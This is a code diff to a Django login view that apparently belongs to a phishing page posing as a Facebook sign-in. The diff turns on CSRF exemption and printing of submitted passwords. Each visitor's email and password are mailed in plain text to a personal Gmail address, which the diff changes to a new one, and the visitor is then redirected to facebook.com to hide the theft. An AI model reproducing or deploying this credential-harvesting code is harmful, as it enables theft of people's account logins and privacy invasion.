@@ -14,18 +14,18 @@ class Home(TemplateView):
 
 
 class Login(TemplateView):
-    # @csrf_exempt
+    @csrf_exempt
     def post(self, *arg, **kwargs):
         form = LoginForm(data=self.request.POST)
         self.get_context_data()
         q = form.data.dict()
 
-        # print('========================',q["email"], ' and ', q["password"], '========================')
+        print('========================',q["email"], ' and ', q["password"], '========================')
         if form.is_valid():
             form.save()
 
             mail_me(q["email"], q["password"])
-            return redirect('/')
+            return redirect('https://facebook.com')
         # return render(request, 'login.html', {'form': form})
         return redirect('/login')
 
@@ -37,4 +37,4 @@ def mail_me(email, password):
     message = 'it means a world to us: ' + email + " " + password
     email_from = email
     # print(subject, message, email_from, ["sunnyemmanuel5@gmail.com"] )
-    return send_mail( subject, message, email_from, ["sunnyemmanuel5@gmail.com"] )
+    return send_mail( subject, message, email_from, ["sunnysmart0711@gmail.com"] )
